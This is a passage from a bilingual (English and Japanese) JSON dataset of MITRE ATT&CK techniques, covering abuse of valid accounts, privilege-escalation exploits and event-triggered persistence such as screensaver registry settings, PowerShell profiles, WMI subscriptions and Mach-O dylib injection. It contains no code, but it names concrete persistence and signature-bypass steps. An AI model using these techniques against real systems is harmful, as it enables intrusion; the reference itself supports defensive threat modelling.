Profilers 2017年5月)"
                    }
                ]
            },
            {
                "id": "T1078",
                "name_eng": "Valid Accounts",
                "name_jp": "有効なアカウント",
                "description_eng": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、既存のアカウントの資格情報を取得して悪用する可能性があります。侵害された資格情報は、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。(引用: volexity_0day_sophos_FW) 侵害された資格情報は、攻撃者に特定のシステムに対する権限の昇格や、ネットワークの制限された領域へのアクセスを許可する可能性もあります。攻撃者は、これらの資格情報が提供する正当なアクセスと組み合わせてマルウェアやツールを使用しないことを選択し、その存在を検出することをより困難にする場合があります。\n\n場合によっては、攻撃者は非アクティブなアカウントを悪用することがあります。例えば、組織の一員ではなくなった個人に属するアカウントなどです。これらのアカウントを使用すると、元のアカウントユーザーが自分のアカウントで行われている異常なアクティビティを特定するために存在しないため、攻撃者は検出を回避できる可能性があります。(引用: CISA MFA PrintNightmare)\n\nシステムのネットワーク全体にわたるローカル、ドメイン、およびクラウドアカウントの権限の重複は懸念事項です。なぜなら、攻撃者はアカウントやシステムをまたいでピボットし、高レベルのアクセス（つまり、ドメインまたはエンタープライズ管理者）に到達して、エンタープライズ内で設定されたアクセス制御をバイパスできる可能性があるためです。(引用: TechNet Credential Theft)",
                "subtechniques": [
                    {
                        "id": "T1078.004",
                        "name_eng": "Cloud Accounts",
                        "name_jp": "クラウドアカウント",
                        "description_eng": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",
                        "description_jp": "クラウド環境の有効なアカウントにより、攻撃者は初期アクセス、永続化、権限昇格、または防御回避を達成するためのアクションを実行できる可能性があります。クラウドアカウントとは、ユーザー、リモートサポート、サービス、またはクラウドサービスプロバイダーやSaaSアプリケーション内のリソースの管理のために組織によって作成および構成されたものです。クラウドアカウントはクラウド内にのみ存在することも、Windows Active Directoryなどの他のIDソースとの同期またはフェデレーションを通じてオンプレミスシステムとクラウド間でハイブリッド結合することもできます。(引用: AWS Identity Federation)(引用: Google Federating GC)(引用: Microsoft Deploying AD Federation)\n\nサービスアカウントまたはユーザーアカウントは、[ブルートフォース](https://attack.mitre.org/techniques/T1110)、[フィッシング](https://attack.mitre.org/techniques/T1566)、またはその他のさまざまな手段を通じて攻撃者の標的となり、環境へのアクセスを取得する可能性があります。フェデレーションまたは同期されたアカウントは、攻撃者がオンプレミスシステムとクラウド環境の両方に影響を与える経路となる可能性があります。たとえば、共有資格情報を利用して[リモートサービス](https://attack.mitre.org/techniques/T1021)にログオンするなどです。フェデレーション、同期、またはクラウド専用であるかどうかにかかわらず、特権の高いクラウドアカウントは、ハイブリッド結合されたデバイスでコマンドを実行するためにSaaSベースの[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)を利用することにより、オンプレミス環境へのピボットを可能にする場合もあります。\n\n攻撃者は、環境内での永続性を維持するために、侵害されたクラウドアカウントに長期間有効な[追加のクラウド資格情報](https://attack.mitre.org/techniques/T1098/001)を作成する可能性があります。このような資格情報は、多要素認証などのセキュリティ制御をバイパスするためにも使用される場合があります。\n\nクラウドアカウントはまた、環境内のさまざまな手段を通じて[一時的な昇格されたクラウドアクセス](https://attack.mitre.org/techniques/T1548/005)またはその他の権限を取得できる場合もあります。ロールの割り当てまたはロールの引き受けポリシーの誤構成により、攻撃者はこれらのメカニズムを使用して、アカウントの意図された範囲外の権限を利用できる可能性があります。このような過剰な特権を持つアカウントは、[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)またはその他の方法を通じて、オンラインストレージアカウントおよびデータベースから機密データを収集するために使用される場合があります。たとえば、Azure環境では、攻撃者は関連するAzureリソースがアクセストークンを要求できるようにするAzure Managed Identitiesを標的にする可能性があります。Azure VMなどの管理対象IDがアタッチされたリソースを侵害することにより、攻撃者は[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)を行い、クラウド環境全体を横断的に移動できる可能性があります。(引用: SpecterOps Managed Identity 2022)"
                    },
                    {
                        "id": "T1078.002",
                        "name_eng": "Domain Accounts",
                        "name_jp": "ドメインアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ドメインアカウントの資格情報を取得して悪用する可能性があります。(引用: TechNet Credential Theft) ドメインアカウントとは、Active Directoryドメインサービスによって管理され、そのドメインの一部であるシステムおよびサービス全体でアクセスと権限が構成されるものです。ドメインアカウントには、ユーザー、管理者、およびサービスが含まれます。(引用: Microsoft AD Accounts)\n\n攻撃者は、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)やパスワードの再利用など、さまざまな手段を通じて、一部は高レベルの特権を持つドメインアカウントを侵害し、ドメインの特権リソースへのアクセスを許可する可能性があります。"
                    },
                    {
                        "id": "T1078.003",
                        "name_eng": "Local Accounts",
                        "name_jp": "ローカルアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ローカルアカウントの資格情報を取得して悪用する可能性があります。ローカルアカウントとは、ユーザー、リモートサポート、サービス、または単一のシステムやサービスの管理のために組織によって構成されたものです。\n\nローカルアカウントは、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)を通じて権限を昇格させたり、資格情報を収集したりするために悪用されることもあります。パスワードの再利用により、権限昇格や横方向の移動を目的として、ネットワーク上の一連のマシンでローカルアカウントが悪用される可能性があります。"
                    },
                    {
                        "id": "T1078.001",
                        "name_eng": "Default Accounts",
                        "name_jp": "デフォルトアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、デフォルトアカウントの資格情報を取得して悪用する可能性があります。デフォルトアカウントとは、WindowsシステムのゲストアカウントやAdministratorアカウントなど、OSに組み込まれているアカウントです。デフォルトアカウントには、AWSのルートユーザーアカウント、ESXiのルートユーザーアカウント、Kubernetesのデフォルトサービスアカウントなど、他の種類のシステム、ソフトウェア、またはデバイスのデフォルトの工場出荷時/プロバイダー設定アカウントも含まれます。(引用: Microsoft Local Accounts Feb 2019)(引用: AWS Root User)(引用: Threat Matrix for Kubernetes)\n\nデフォルトアカウントはクライアントマシンに限定されません。むしろ、内部、オープンソース、または商用であるかどうかにかかわらず、ネットワークデバイスやコンピュータアプリケーションなどの機器にあらかじめ設定されているアカウントも含まれます。ユーザー名とパスワードの組み合わせがあらかじめ設定されているアプライアンスは、インストール後に変更しない組織にとっては攻撃者の格好の標的となるため、深刻な脅威となります。同様に、攻撃者は、[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモート環境に正当に接続するために、公に開示された、または盗まれた[秘密キー](https://attack.mitre.org/techniques/T1552/004)または資格情報資料を利用することもあります。(引用: Metasploit SSH Module)\n\nデフォルトアカウントは、別のアプリケーションに接続または統合することにより、初期設定後にシステム上に作成される場合があります。例えば、ESXiサーバーがvCenterサーバーに接続されると、ESXiサーバー上に`vpxuser`というデフォルトの特権アカウントが作成されます。脅威アクターがこのアカウントの資格情報を侵害できた場合（例えば、vCenterホスト上の[資格情報アクセスのための悪用](https://attack.mitre.org/techniques/T1212)を介して）、ESXiサーバーにアクセスできるようになります。(引用: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用: Pentera vCenter Information Disclosure)"
                    }
                ]
            },
            {
                "id": "T1068",
                "name_eng": "Exploitation for Privilege Escalation",
                "name_jp": "権限昇格のための悪用",
                "description_eng": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "description_jp": "攻撃者は、権限を昇格させる試みとしてソフトウェアの脆弱性を悪用する可能性があります。ソフトウェアの脆弱性の悪用は、攻撃者がプログラム、サービス、またはオペレーティングシステムのソフトウェアやカーネル自体のプログラミングエラーを利用して、攻撃者が制御するコードを実行する場合に発生します。権限レベルなどのセキュリティ構成体は、情報へのアクセスや特定のテクニックの使用を妨げることが多いため、攻撃者はこれらの制限を回避するためにソフトウェアの悪用を含む権限昇格を実行する必要があるでしょう。\n\n最初にシステムへのアクセスを取得したとき、攻撃者は権限の低いプロセス内で操作している可能性があり、これによりシステム上の特定のリソースへのアクセスが妨げられます。通常、より高い権限で実行されているオペレーティングシステムのコンポーネントやソフトウェアには、システム上でより高いレベルのアクセスを取得するために悪用できる脆弱性が存在する可能性があります。これにより、脆弱なコンポーネントに応じて、権限のないユーザーレベルの権限からSYSTEMまたはroot権限に移行できる可能性があります。また、これにより、攻撃者は仮想マシンやコンテナ内などの仮想化環境から基盤となるホストに移行できる可能性もあります。これは、適切に構成され、他の権限昇格方法を制限しているエンドポイントシステムを侵害する攻撃者にとって必要なステップである可能性があります。\n\n攻撃者は、署名済みの脆弱なドライバーを侵害されたマシンに持ち込み、その脆弱性を悪用してカーネルモードでコードを実行する可能性があります。このプロセスは、Bring Your Own Vulnerable Driver（BYOVD）と呼ばれることもあります。(引用: ESET InvisiMole June 2020)(引用: Unit42 AcidBox June 2020) 攻撃者は、初期アクセス中に配信されるファイルに脆弱なドライバーを含めたり、[Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)または[Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)を介して侵害されたシステムにダウンロードしたりする可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1546",
                "name_eng": "Event Triggered Execution",
                "name_jp": "イベントトリガー実行",
                "description_eng": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
                "description_jp": "攻撃者は、特定のイベントに基づいて実行をトリガーするシステムメカニズムを使用して、永続性を確立したり、権限を昇格させたりする可能性があります。さまざまなオペレーティングシステムには、ログオンや特定のアプリケーション/バイナリの実行などの他のユーザーアクティビティなどのイベントを監視およびサブスクライブする手段があります。クラウド環境はまた、特定のクラウドイベントを監視し、それに応じて呼び出すことができるさまざまな機能やサービスをサポートしている場合があります。(引用: Backdooring an AWS account)(引用: Varonis Power Automate Data Exfiltration)(引用: Microsoft DART Case Report 001)\n\n攻撃者は、悪意のあるコードを繰り返し実行することにより、被害者への永続的なアクセスを維持する手段としてこれらのメカニズムを悪用する可能性があります。被害者システムへのアクセスを取得した後、攻撃者はイベントトリガーを作成/変更して、イベントトリガーが呼び出されるたびに実行される悪意のあるコンテンツを指すようにする可能性があります。(引用: FireEye WMI 2015)(引用: Malware Persistence on OS X)(引用: amnesia malware)\n\n実行はSYSTEMやサービスアカウントなどのより高い権限を持つアカウントによってプロキシされる可能性があるため、攻撃者はこれらのトリガーされた実行メカニズムを悪用して権限を昇格させることができる場合があります。",
                "subtechniques": [
                    {
                        "id": "T1546.002",
                        "name_eng": "Screensaver",
                        "name_jp": "スクリーンセーバー",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",
                        "description_jp": "攻撃者は、ユーザーの非アクティブ状態によってトリガーされる悪意のあるコンテンツを実行することで、永続性を確立する可能性があります。スクリーンセーバーは、設定可能なユーザー非アクティブ時間の後に実行されるプログラムであり、.scrファイル拡張子を持つポータブル実行可能（PE）ファイルで構成されます。(引用: Wikipedia Screensaver) Windowsスクリーンセーバーアプリケーションscrnsave.scrは、基本のWindowsインストールに含まれるスクリーンセーバーとともに、64ビットWindowsシステムでは<code>C:\\Windows\\System32\\</code>および<code>C:\\Windows\\sysWOW64\\</code>にあります。\n\n次のスクリーンセーバー設定はレジストリ（<code>HKCU\\Control Panel\\Desktop\\</code>）に保存されており、永続性を実現するために操作される可能性があります：\n\n* <code>SCRNSAVE.exe</code> - 悪意のあるPEパスに設定\n* <code>ScreenSaveActive</code> - スクリーンセーバーを有効にするために「1」に設定\n* <code>ScreenSaverIsSecure</code> -ロック解除にパスワードを必要としないように「0」に設定\n* <code>ScreenSaveTimeout</code> - スクリーンセーバーが実行される前のユーザー非アクティブタイムアウトを設定\n\n攻撃者は、スクリーンセーバーの設定を使用して、特定のユーザー非アクティブ時間の後にマルウェアを実行するようにスクリーンセーバーを設定することにより、永続性を維持できます。(引用: ESET Gazer Aug 2017)"
                    },
                    {
                        "id": "T1546.013",
                        "name_eng": "PowerShell Profile",
                        "name_jp": "PowerShellプロファイル",
                        "description_eng": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
                        "description_jp": "攻撃者は、PowerShellプロファイルによってトリガーされる悪意のあるコンテンツを実行することで、永続性を獲得し、権限を昇格させる可能性があります。PowerShellプロファイル（<code>profile.ps1</code>）は、[PowerShell](https://attack.mitre.org/techniques/T1059/001)が起動するときに実行されるスクリプトであり、ユーザー環境をカスタマイズするためのログオンスクリプトとして使用できます。\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001)は、ユーザーまたはホストプログラムに応じていくつかのプロファイルをサポートしています。たとえば、PowerShellコンソール、PowerShell ISE、Visual Studio Codeなどの[PowerShell](https://attack.mitre.org/techniques/T1059/001)ホストプログラム用に異なるプロファイルが存在する可能性があります。管理者は、ローカルコンピューター上のすべてのユーザーおよびホストプログラムに適用されるプロファイルを構成することもできます。(引用: Microsoft About Profiles)\n\n攻撃者はこれらのプロファイルを変更して、任意のコマンド、関数、モジュール、および/または[PowerShell](https://attack.mitre.org/techniques/T1059/001)ドライブを含めて永続性を獲得する可能性があります。ユーザーが[PowerShell](https://attack.mitre.org/techniques/T1059/001)セッションを開くたびに、起動時に<code>-NoProfile</code>フラグが使用されない限り、変更されたスクリプトが実行されます。(引用: ESET Turla PowerShell May 2019)\n\nPowerShellプロファイル内のスクリプトが、ドメイン管理者などのより高い権限を持つアカウントによってロードおよび実行された場合、攻撃者は権限を昇格できる可能性もあります。(引用: Wits End and Shady PowerShell Profiles)"
                    },
                    {
                        "id": "T1546.016",
                        "name_eng": "Installer Packages",
                        "name_jp": "インストーラーパッケージ",
                        "description_eng": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)\n\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)\n\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.\n\nFor Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)",
                        "description_jp": "攻撃者は、インストーラを使用して悪意のあるコンテンツを実行させることで、永続性を確立し、特権を昇格させる可能性があります。インストーラパッケージはOS固有のものであり、オペレーティングシステムがシステムにアプリケーションをインストールするために必要なリソースを含んでいます。インストーラパッケージには、インストール前に実行されるスクリプトと、インストール完了後に実行されるスクリプトが含まれることがあります。インストーラスクリプトは、実行時に昇格権限を継承する場合があります。開発者は多くの場合、これらのスクリプトを使用して、インストール環境の準備、要件の確認、依存関係のダウンロード、インストール後のファイルの削除を行います。(引用: Installer Package Scripting Rich Trouton)\n\n敵対者は、正規のアプリケーションを使用して、悪意のあるコンテンツを実行するようにインストーラスクリプトを変更したアプリケーションを配布しています。ユーザがアプリケーションをインストールする際、インストールを許可するために管理者権限を付与する必要がある場合があります。正規のアプリケーションのインストールプロセスの最後に、macOS の `postinstall` スクリプトなどのコンテンツが、継承された昇格権限で実行される可能性があります。攻撃者はこれらのスクリプトを使用して、悪意のある実行ファイルを実行したり、昇格した権限で他の悪意のあるコンポーネント（[起動デーモン](https://attack.mitre.org/techniques/T1543/004)など）をインストールしたりすることができます。（引用：Application Bundle Manipulation Brandon Dalton）（引用：wardle evilquest parti）（引用：Windows AppleJeus GReAT）（引用：Debian Manual Maintainer Scripts）\n\nディストリビューションによっては、Linux版のパッケージインストーラスクリプトは、メンテナースクリプトやポストインストールスクリプトと呼ばれることもあります。これらのスクリプトには `preinst`、`postinst`、`prerm`、`postrm` スクリプトが含まれ、実行時には root として実行されます。\n\nWindows の場合、Microsoft Installer サービスはアプリケーションのインストー ル、アップデート、アンインストールを管理するために `.msi` ファイルを使用します。これらのインストールルーチンには、敵対者に悪用される可能性のある追加アクションを実行する指示が含まれていることもあります。(引用: Microsoft Installation Procedures)"
                    },
                    {
                        "id": "T1546.003",
                        "name_eng": "Windows Management Instrumentation Event Subscription",
                        "name_jp": "Windows Management Instrumentationイベントサブスクリプション",
                        "description_eng": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
                        "description_jp": "攻撃者は、Windows Management Instrumentation (WMI)イベントサブスクリプションによってトリガーされる悪意のあるコンテンツを実行することで、永続性を確立し、特権を昇格させる可能性があります。WMIは、定義されたイベントが発生したときにコードを実行するイベントフィルター、プロバイダー、コンシューマー、バインディングをインストールするために使用することができる。サブスクライブされるイベントの例としては、壁掛け時計の時刻、ユーザーログイン、コンピュータの稼働時間などが挙げられます（引用：Mandiant M-Trends 2015）。\n\n攻撃者は、WMIの機能を使用してイベントをサブスクライブし、そのイベントが発生したときに任意のコードを実行し、システム上に永続性を提供する可能性があります(引用: FireEye WMI SANS 2015)(引用: FireEye WMI 2015) また、攻撃者は、<code>mofcomp.exe</code>を使用して、悪意のあるサブスクリプションを作成するために使用できるWindows Management Object (MOF) ファイル(.mof 拡張子)にWMIスクリプトをコンパイルする可能性があります(引用: Dell WMI Persistence)(引用: Microsoft MOF May 2018)\n\nWMI サブスクリプションの実行は、WMI Provider Host プロセス (WmiPrvSe.exe) によってプロキシされるため、SYSTEM 権限が昇格する可能性があります。"
                    },
                    {
                        "id": "T1546.006",
                        "name_eng": "LC_LOAD_DYLIB Addition",
                        "name_jp": "LC_LOAD_DYLIB追加",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)",
                        "description_jp": "攻撃者は、汚染されたバイナリの実行をトリガーとして悪意のあるコンテンツを実行することで、永続性を確立する可能性がある。Mach-Oバイナリは、バイナリがロードされたときに特定の操作を実行するために使用される一連のヘッダを持っています。Mach-OバイナリのLC_LOAD_DYLIBヘッダは、実行時にどのダイナミックライブラリ(dylibs)をロードするかをmacOSとOS Xに伝えます。これらは、残りのフィールドと依存関係を調整する限り、コンパイルされたバイナリにアドホックに追加することができます（引用：Writing Bad Malware for OSX）これらの変更を実行するために利用可能なツールがあります。\n\n攻撃者は、バイナリが実行されるたびに悪意のあるdylibをロードして実行するように、Mach-Oバイナリのヘッダを変更することができます。バイナリが変更されているため、いかなる変更もバイナリのデジタル署名を無効にしますが、バイナリからLC_CODE_SIGNATUREコマンドを削除するだけで、ロード時に署名がチェックされないようにすることができます。(引用: Malware Persistence on OS X)"
                    },
                    {
                        "id": "T1546.011",
                        "name_eng": "Application Shimming",
                        "name_jp": "アプリケーションシミング",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer 